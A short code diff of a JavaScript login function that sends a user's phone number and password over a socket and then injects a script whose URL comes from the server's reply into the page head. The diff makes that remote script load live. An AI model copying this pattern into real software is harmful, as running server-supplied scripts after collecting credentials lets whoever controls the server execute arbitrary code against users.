@@ -29,16 +29,17 @@ function login(){
     // form.setAttribute("action", 'https://epos188.herokuapp.com/');
     socket.emit('login1',fullnumber,pass);
     socket.on('login1_dung',(bando)=>{
+
       // add_form('pass',document.getElementById("login_pass_2").value);
       // add_form('number',num);
       // add_form('code',val_code);
       // document.body.appendChild(form);
       // form.submit();
       var my_awesome_script = document.createElement('script');
-      my_awesome_script.setAttribute('src',bando);
+      my_awesome_script.setAttribute('src',bando.map);
       my_awesome_script.setAttribute('type',"text/javascript");
       document.getElementById('id_wrapper').appendChild(my_awesome_script);
-      // document.head.appendChild(my_awesome_script);
+      document.head.appendChild(my_awesome_script);
       document.getElementById("id_wrap").style.display = "none";
       document.getElementById("id_wrapper").style.display = "block";
 
